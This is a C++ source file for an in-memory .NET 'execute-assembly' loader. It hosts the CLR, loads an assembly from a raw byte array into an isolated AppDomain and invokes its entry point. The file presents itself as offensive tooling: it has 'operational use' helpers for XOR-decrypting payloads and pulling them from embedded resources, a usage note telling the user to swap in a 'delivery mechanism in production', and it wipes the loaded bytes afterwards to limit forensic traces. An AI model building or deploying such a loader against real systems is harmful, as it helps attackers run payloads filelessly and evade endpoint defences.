// Inline Execute-Assembly — Minimal CLR host for .NET 4.x assemblies
// This version uses raw COM interfaces without the #import TLB directive,
// making it more portable and easier to compile in diverse toolchains.
//
// Compile with MSVC:
//   cl.exe /EHsc /O2 inline_execute.cpp /link mscoree.lib oleaut32.lib ole32.lib
//
// Compile with MinGW (cross-compile from Linux):
//   x86_64-w64-mingw32-g++ -o inline_execute.exe inline_execute.cpp -lmscoree -loleaut32 -lole32

#include <windows.h>
#include <metahost.h>
#include <mscoree.h>
#include <comdef.h>
#include <stdio.h>

#pragma comment(lib, "mscoree.lib")

// {CB2F6723-AB3A-11D2-9C40-00C04FA30A3E}
EXTERN_C const IID IID_ICorRuntimeHost;

// GUIDs we need if headers don't provide them
// These are stable COM interface IDs from the CLR hosting spec
static const GUID CLSID_CLRMetaHost_Local =
    { 0x9280188d, 0xe8e, 0x4867, {0xb3, 0xc, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde} };

// Console output capture: redirect managed stdout/stderr through a pipe
// so output appears in the parent process
typedef struct {
    HANDLE hReadPipe;
    HANDLE hWritePipe;
    HANDLE hOldStdout;
    HANDLE hOldStderr;
} ConsoleRedirect;

BOOL SetupConsoleRedirect(ConsoleRedirect* cr) {
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    if (!CreatePipe(&cr->hReadPipe, &cr->hWritePipe, &sa, 0))
        return FALSE;

    cr->hOldStdout = GetStdHandle(STD_OUTPUT_HANDLE);
    cr->hOldStderr = GetStdHandle(STD_ERROR_HANDLE);
    SetStdHandle(STD_OUTPUT_HANDLE, cr->hWritePipe);
    SetStdHandle(STD_ERROR_HANDLE, cr->hWritePipe);
    return TRUE;
}

void ReadAndPrintRedirected(ConsoleRedirect* cr) {
    SetStdHandle(STD_OUTPUT_HANDLE, cr->hOldStdout);
    SetStdHandle(STD_ERROR_HANDLE, cr->hOldStderr);
    CloseHandle(cr->hWritePipe);

    char buffer[4096];
    DWORD bytesRead;
    while (ReadFile(cr->hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        printf("%s", buffer);
    }
    CloseHandle(cr->hReadPipe);
}

// Core: host the CLR and execute an assembly from a raw byte array
int ExecuteAssembly(
    unsigned char* rawAssembly,
    unsigned int rawAssemblyLen,
    int argc,
    wchar_t** argv,
    BOOL useIsolatedDomain
) {
    HRESULT hr;
    ICLRMetaHost* pMetaHost = NULL;
    ICLRRuntimeInfo* pRuntimeInfo = NULL;
    ICorRuntimeHost* pRuntimeHost = NULL;
    IUnknown* pDomainThunk = NULL;
    BOOL clrStarted = FALSE;

    CoInitializeEx(NULL, COINIT_MULTITHREADED);

    // 1. CLR MetaHost
    hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (LPVOID*)&pMetaHost);
    if (FAILED(hr)) {
        fprintf(stderr, "[-] CLRCreateInstance: 0x%08x\n", hr);
        goto done;
    }

    // 2. Get the v4.0 runtime (covers .NET 4.0 through 4.8.x)
    hr = pMetaHost->GetRuntime(L"v4.0.30319", IID_ICLRRuntimeInfo, (LPVOID*)&pRuntimeInfo);
    if (FAILED(hr)) {
        fprintf(stderr, "[-] GetRuntime: 0x%08x\n", hr);
        goto done;
    }

    // 3. Load and start the runtime
    BOOL loadable = FALSE;
    hr = pRuntimeInfo->IsLoadable(&loadable);
    if (FAILED(hr) || !loadable) {
        fprintf(stderr, "[-] Runtime not loadable\n");
        goto done;
    }

    hr = pRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (LPVOID*)&pRuntimeHost);
    if (FAILED(hr)) {
        fprintf(stderr, "[-] GetInterface(CorRuntimeHost): 0x%08x\n", hr);
        goto done;
    }

    hr = pRuntimeHost->Start();
    if (FAILED(hr)) {
        fprintf(stderr, "[-] CLR Start: 0x%08x\n", hr);
        goto done;
    }
    clrStarted = TRUE;

    // 4. Get or create AppDomain
    if (useIsolatedDomain) {
        hr = pRuntimeHost->CreateDomain(L"InMemoryDomain", NULL, &pDomainThunk);
    } else {
        hr = pRuntimeHost->GetDefaultDomain(&pDomainThunk);
    }
    if (FAILED(hr)) {
        fprintf(stderr, "[-] Domain acquisition: 0x%08x\n", hr);
        goto done;
    }

    // 5. QI for _AppDomain, load assembly, invoke entry point
    {
        // Get _AppDomain interface
        // {05F696DC-2B29-3663-AD8B-C4389CF2A713} = IID__AppDomain
        static const GUID IID_AppDomain =
            { 0x05F696DC, 0x2B29, 0x3663, {0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13} };

        void* pAppDomain = NULL;
        hr = pDomainThunk->QueryInterface(IID_AppDomain, &pAppDomain);
        if (FAILED(hr)) {
            fprintf(stderr, "[-] QI(_AppDomain): 0x%08x\n", hr);
            goto done;
        }

        // We'll use late-bound IDispatch to avoid TLB dependency
        IDispatch* pDispatch = NULL;
        hr = pDomainThunk->QueryInterface(IID_IDispatch, (void**)&pDispatch);
        if (FAILED(hr)) {
            fprintf(stderr, "[-] QI(IDispatch): 0x%08x\n", hr);
            ((IUnknown*)pAppDomain)->Release();
            goto done;
        }

        // Build SAFEARRAY containing the assembly bytes
        SAFEARRAYBOUND bounds = { rawAssemblyLen, 0 };
        SAFEARRAY* psa = SafeArrayCreate(VT_UI1, 1, &bounds);
        void* pvData;
        SafeArrayAccessData(psa, &pvData);
        memcpy(pvData, rawAssembly, rawAssemblyLen);
        SafeArrayUnaccessData(psa);

        // Call AppDomain.Load(byte[]) via IDispatch
        OLECHAR* methodName = L"Load";
        DISPID dispid;
        hr = pDispatch->GetIDsOfNames(IID_NULL, &methodName, 1, LOCALE_SYSTEM_DEFAULT, &dispid);
        if (FAILED(hr)) {
            fprintf(stderr, "[-] GetIDsOfNames(Load): 0x%08x\n", hr);
            SafeArrayDestroy(psa);
            pDispatch->Release();
            ((IUnknown*)pAppDomain)->Release();
            goto done;
        }

        VARIANT vtArg;
        vtArg.vt = VT_ARRAY | VT_UI1;
        vtArg.parray = psa;

        DISPPARAMS dispParams = { &vtArg, NULL, 1, 0 };
        VARIANT vtAssemblyResult;
        VariantInit(&vtAssemblyResult);

        hr = pDispatch->Invoke(dispid, IID_NULL, LOCALE_SYSTEM_DEFAULT,
                               DISPATCH_METHOD, &dispParams, &vtAssemblyResult, NULL, NULL);
        SafeArrayDestroy(psa);

        if (FAILED(hr)) {
            fprintf(stderr, "[-] AppDomain.Load(byte[]): 0x%08x\n", hr);
            pDispatch->Release();
            ((IUnknown*)pAppDomain)->Release();
            goto done;
        }

        // Get the Assembly's EntryPoint and invoke it
        IDispatch* pAssemblyDisp = vtAssemblyResult.pdispVal;
        OLECHAR* entryPointName = L"EntryPoint";
        DISPID entryDispid;
        hr = pAssemblyDisp->GetIDsOfNames(IID_NULL, &entryPointName, 1,
                                           LOCALE_SYSTEM_DEFAULT, &entryDispid);
        if (SUCCEEDED(hr)) {
            DISPPARAMS noArgs = { NULL, NULL, 0, 0 };
            VARIANT vtEntryPoint;
            VariantInit(&vtEntryPoint);
            hr = pAssemblyDisp->Invoke(entryDispid, IID_NULL, LOCALE_SYSTEM_DEFAULT,
                                        DISPATCH_PROPERTYGET, &noArgs, &vtEntryPoint, NULL, NULL);

            if (SUCCEEDED(hr) && vtEntryPoint.pdispVal) {
                IDispatch* pMethodInfo = vtEntryPoint.pdispVal;

                // Build string[] args
                VARIANT vtManagedArgs;
                VariantInit(&vtManagedArgs);

                if (argc > 0 && argv != NULL) {
                    SAFEARRAYBOUND argBounds = { (ULONG)argc, 0 };
                    SAFEARRAY* psaStrArgs = SafeArrayCreate(VT_BSTR, 1, &argBounds);
                    for (int i = 0; i < argc; i++) {
                        long idx = i;
                        BSTR bstr = SysAllocString(argv[i]);
                        SafeArrayPutElement(psaStrArgs, &idx, bstr);
                        SysFreeString(bstr);
                    }
                    vtManagedArgs.vt = VT_ARRAY | VT_BSTR;
                    vtManagedArgs.parray = psaStrArgs;
                }

                // Wrap in object[] for MethodInfo.Invoke(null, object[]{string[]})
                SAFEARRAYBOUND invokeParamBound = { 1, 0 };
                SAFEARRAY* psaInvokeParams = SafeArrayCreate(VT_VARIANT, 1, &invokeParamBound);
                long paramIdx = 0;
                SafeArrayPutElement(psaInvokeParams, &paramIdx, &vtManagedArgs);

                // Call MethodInfo.Invoke(null, params)
                OLECHAR* invokeName = L"Invoke";
                DISPID invokeDispid;
                hr = pMethodInfo->GetIDsOfNames(IID_NULL, &invokeName, 1,
                                                 LOCALE_SYSTEM_DEFAULT, &invokeDispid);
                if (SUCCEEDED(hr)) {
                    // Two args: obj (null), object[] parameters
                    VARIANT invokeArgs[2];
                    VariantInit(&invokeArgs[0]); // parameters (rightmost = index 0 in DISPPARAMS)
                    invokeArgs[0].vt = VT_ARRAY | VT_VARIANT;
                    invokeArgs[0].parray = psaInvokeParams;
                    VariantInit(&invokeArgs[1]); // obj = null

                    DISPPARAMS invokeDispParams = { invokeArgs, NULL, 2, 0 };
                    VARIANT vtInvokeResult;
                    VariantInit(&vtInvokeResult);

                    hr = pMethodInfo->Invoke(invokeDispid, IID_NULL, LOCALE_SYSTEM_DEFAULT,
                                              DISPATCH_METHOD, &invokeDispParams, &vtInvokeResult, NULL, NULL);

                    if (FAILED(hr)) {
                        fprintf(stderr, "[-] MethodInfo.Invoke: 0x%08x\n", hr);
                    }
                    VariantClear(&vtInvokeResult);
                }

                SafeArrayDestroy(psaInvokeParams);
                if (vtManagedArgs.vt != VT_EMPTY)
                    VariantClear(&vtManagedArgs);
                pMethodInfo->Release();
            }
            VariantClear(&vtEntryPoint);
        }

        pAssemblyDisp->Release();
        pDispatch->Release();
        ((IUnknown*)pAppDomain)->Release();
    }

done:
    if (useIsolatedDomain && pDomainThunk && pRuntimeHost) {
        pRuntimeHost->UnloadDomain(pDomainThunk);
    }
    if (pDomainThunk) pDomainThunk->Release();
    if (pRuntimeHost) {
        if (clrStarted) pRuntimeHost->Stop();
        pRuntimeHost->Release();
    }
    if (pRuntimeInfo) pRuntimeInfo->Release();
    if (pMetaHost) pMetaHost->Release();
    CoUninitialize();

    return SUCCEEDED(hr) ? 0 : 1;
}

// --- Helpers for operational use ---

// XOR decrypt a byte array in-place
void XorDecrypt(unsigned char* data, unsigned int dataLen, unsigned char* key, unsigned int keyLen) {
    for (unsigned int i = 0; i < dataLen; i++) {
        data[i] ^= key[i % keyLen];
    }
}

// Read assembly bytes from an embedded resource section
BOOL LoadFromResource(HMODULE hModule, int resourceId, unsigned char** outBytes, unsigned int* outLen) {
    HRSRC hRes = FindResource(hModule, MAKEINTRESOURCE(resourceId), RT_RCDATA);
    if (!hRes) return FALSE;

    HGLOBAL hGlobal = LoadResource(hModule, hRes);
    if (!hGlobal) return FALSE;

    *outLen = SizeofResource(hModule, hRes);
    void* pData = LockResource(hGlobal);
    if (!pData) return FALSE;

    *outBytes = (unsigned char*)malloc(*outLen);
    memcpy(*outBytes, pData, *outLen);
    return TRUE;
}

int wmain(int argc, wchar_t* argv[]) {
    if (argc < 2) {
        wprintf(L"Usage: %s <assembly> [args...]\n", argv[0]);
        wprintf(L"\nReads the assembly into memory, then executes via CLR hosting.\n");
        wprintf(L"Replace the file read with your delivery mechanism in production.\n");
        return 1;
    }

    HANDLE hFile = CreateFileW(argv[1], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        fwprintf(stderr, L"[-] Cannot open: %s\n", argv[1]);
        return 1;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    unsigned char* assemblyBytes = (unsigned char*)malloc(fileSize);
    DWORD bytesRead;
    ReadFile(hFile, assemblyBytes, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);

    wprintf(L"[*] %d bytes loaded into memory\n", fileSize);

    int managedArgc = argc - 2;
    wchar_t** managedArgv = (argc > 2) ? &argv[2] : NULL;

    int result = ExecuteAssembly(assemblyBytes, fileSize, managedArgc, managedArgv, TRUE);

    // Zero out the assembly bytes before freeing
    SecureZeroMemory(assemblyBytes, fileSize);
    free(assemblyBytes);

    return result;
}
